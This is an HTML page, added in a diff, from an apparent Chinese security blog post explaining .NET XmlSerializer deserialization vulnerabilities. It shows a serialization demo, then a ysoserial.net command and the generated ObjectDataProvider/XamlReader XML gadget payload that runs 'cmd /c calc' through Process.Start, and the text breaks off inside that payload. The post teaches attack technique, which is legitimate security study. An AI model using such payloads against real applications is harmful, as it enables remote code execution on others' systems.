@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Dot NET-XmlSerializer反序列化漏洞 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='XmlSerializer反序列化漏洞'>
+  <meta itemprop="name" content="Dot NET-XmlSerializer反序列化漏洞">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-06-03T23:27:25+08:00">
+  <meta itemprop="dateModified" content="2025-06-03T23:27:25+08:00">
+  <meta itemprop="wordCount" content="2391">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="XmlSerializer反序列化漏洞"><meta property="og:url" content="http://localhost:1313/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="Dot NET-XmlSerializer反序列化漏洞">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-03T23:27:25+08:00">
+    <meta property="article:modified_time" content="2025-06-03T23:27:25+08:00">
+    <meta property="article:tag" content="XmlSerializer反序列化漏洞">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="Dot NET-XmlSerializer反序列化漏洞">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Dot NET-XmlSerializer反序列化漏洞 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/dot-net%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="Dot NET序列化基础知识" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.md" title="Dot NET-XmlSerializer反序列化漏洞 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Dot NET-XmlSerializer反序列化漏洞",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\/"
+    },"genre": "posts","keywords": "XmlSerializer反序列化漏洞","wordcount":  2391 ,
+    "url": "http:\/\/localhost:1313\/dot-net-xmlserializer%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\/","datePublished": "2025-06-03T23:27:25+08:00","dateModified": "2025-06-03T23:27:25+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">Dot NET-XmlSerializer反序列化漏洞</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>Dot NET-XmlSerializer反序列化漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/.net/" class="post-category" title="Category - .NET"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> .NET</a></span></div><div class="post-meta-line"><span title="published on 2025-06-03 23:27:25"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-06-03">2025-06-03</time></span>&nbsp;<span title="2391 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#xmlserializer基础知识">XmlSerializer基础知识</a></li>
+    <li><a href="#xmlserializer序列化">XmlSerializer序列化</a></li>
+    <li><a href="#xmlserialize反序列化">XmlSerialize反序列化</a>
+      <ul>
+        <li><a href="#objectdataprovider">ObjectDataProvider</a></li>
+        <li><a href="#resourcedictionary">ResourceDictionary</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="xmlserializer基础知识" class="heading-element"><span>XmlSerializer基础知识</span>
+  <a href="#xmlserializer%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在.NET框架中的<code>XmlSerializer</code>类可以将高度结构化的XML数据映射为<code>.NET</code>对象。XmlSerializer类在程序中通过单个API调用来执行XML文档和对象之间的转换。转换的映射规则在<code>.NET</code>类中通过元数据属性来表示，如果程序开发人员使用<code>Type</code>类的静态方法获取外界数据，并调用<code>Desierialize</code>反序列化xml数据就会触发反序列化漏洞攻击。</p>
+<h2 id="xmlserializer序列化" class="heading-element"><span>XmlSerializer序列化</span>
+  <a href="#xmlserializer%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>.NET</code>框架中<code>System.Xml.Serialization</code>命名空间下的<code>XmlSerializer</code>类可以将XML文件绑定到<code>.NET</code>类的实例，需要注意它只能把对象的公共属性和公共字段转换为<code>XML</code>元素或属性，并且由两个方法组成<code>Serialize()</code>用于从对象实例生成XML；<code>Deserialize()</code>用于将XML文档分析成对象图，被序列化的数据可以是数据、字段、数组、以及XMLElement和XmlAttribute对象格式的内嵌XML。<br>
+Demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Xml.Serialization</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">XmlDeserialization</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="na">    [XmlRoot]</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">Person</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="na">        [XmlElement]</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">age</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="na">        [XmlElement]</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">string</span> <span class="n">name</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="na">        [XmlAttribute]</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">string</span> <span class="n">friend</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Person</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Person</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="p">.</span><span class="n">name</span> <span class="p">=</span> <span class="s">&#34;Tom&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="p">.</span><span class="n">age</span> <span class="p">=</span> <span class="m">18</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="p">.</span><span class="n">friend</span> <span class="p">=</span> <span class="s">&#34;Jim&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">XmlSerializer</span> <span class="n">xmlSerializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Person</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">TextWriter</span> <span class="n">writer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">xmlSerializer</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">memoryStream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="c1">// 输出xml  </span>
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()));</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506031951440.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>XmlElement</code>指定属性要序列化为元素，XMLAttribute指定属性要序列化为特性，XmlRoot指定类要序列化为根元素；通过特性类型的属性、影响要生成的名称、名称空间和类型。在创建一个<code>Person</code>类的实例填充其属性为序列化为文件。XmlSerializer.Serialize方法重载可以接受Stream、TextWrite、XmlWrite类。</p>
+<h2 id="xmlserialize反序列化" class="heading-element"><span>XmlSerialize反序列化</span>
+  <a href="#xmlserialize%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>反序列化就是把xml文件转换为对象是通过创建一个新对象的方式调用XmlSerializer.Deserialize方法实现的，在序列化最关键的一环当属new XmlSerializer构造方法里所传的参数，这个参数来自<code>System.Type</code>类，通过这个类可以访问关于任意数据类型的信息，指向任何给定类型的<code>Type</code>引用有以下三种方式。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">typeof</span><span class="p">(</span><span class="n">Person</span><span class="p">)</span> <span class="c1">//表示获取Person类的Type  </span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">GetType</span><span class="p">();</span> <span class="c1">//获取Person类的Type  </span>
+</span></span><span class="line"><span class="cl"><span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;Person&#34;</span><span class="p">);</span> <span class="c1">//Type类的静态方法GetType，引入传入字符串，必须是全限定名  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最经典的攻击类就是<code>ObjectDataProvider</code>，利用<code>yso</code>生成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nlrvana</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">ysoserial</span><span class="p">.</span><span class="nb">net-master</span><span class="p">\</span><span class="n">ysoserial</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;</span><span class="n">ysoserial</span><span class="p">.</span><span class="py">exe</span> <span class="n">-g</span> <span class="n">ObjectDataProvider</span> <span class="n">-c</span> <span class="n">calc</span> <span class="o">-f</span> <span class="n">xmlserializer</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="k">?</span><span class="n">xml</span> <span class="n">version</span><span class="p">=</span><span class="s2">&#34;1.0&#34;</span><span class="p">?&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">root</span> <span class="n">type</span><span class="p">=</span><span class="s2">&#34;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="n">ExpandedWrapperOfXamlReaderObjectDataProvider</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">xsi</span><span class="p">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">xsd</span><span class="p">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="n">ExpandedElement</span><span class="p">/&gt;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="n">ProjectedProperty0</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="n">MethodName</span><span class="p">&gt;</span><span class="n">Parse</span><span class="p">&lt;/</span><span class="n">MethodName</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="n">MethodParameters</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="n">anyType</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">xsi</span><span class="p">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">xsd</span><span class="p">=</span><span class="s2">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="n">xsi</span><span class="err">:</span><span class="n">type</span><span class="p">=</span><span class="s2">&#34;xsd:string&#34;</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">                    <span class="p">&lt;![</span><span class="n">CDATA</span><span class="p">[&lt;</span><span class="n">ResourceDictionary</span> <span class="n">xmlns</span><span class="p">=</span><span class="s2">&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">d</span><span class="p">=</span><span class="s2">&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">b</span><span class="p">=</span><span class="s2">&#34;clr-namespace:System;assembly=mscorlib&#34;</span> <span class="n">xmlns</span><span class="err">:</span><span class="n">c</span><span class="p">=</span><span class="s2">&#34;clr-namespace:System.Diagnostics;assembly=system&#34;</span><span class="p">&gt;&lt;</span><span class="n">ObjectDataProvider</span> <span class="n">d:Key</span><span class="p">=</span><span class="s2">&#34;&#34;</span> <span class="n">ObjectType</span><span class="p">=</span><span class="s2">&#34;{d:Type c:Process}&#34;</span> <span class="n">MethodName</span><span class="p">=</span><span class="s2">&#34;Start&#34;</span><span class="p">&gt;&lt;</span><span class="n">ObjectDataProvider</span><span class="p">.</span><span class="n">MethodParameters</span><span class="p">&gt;&lt;</span><span class="n">b:String</span><span class="p">&gt;</span><span class="n">cmd</span><span class="p">&lt;/</span><span class="n">b:String</span><span class="p">&gt;&lt;</span><span class="n">b:String</span><span class="p">&gt;/</span><span class="n">c</span> <span class="n">calc</span><span class="p">&lt;/</span><span class="n">b:String</span><span class="p">&gt;&lt;/</span><span class="n">ObjectDataProvider</span><span class="p">.</span><span class="n">MethodParameters</span><span class="p">&gt;&lt;/</span><span class="n">ObjectDataProvider</span><span class="p">&gt;&lt;/</span><span class="n">ResourceDictionary</span><span class="p">&gt;]]&gt;</span>  
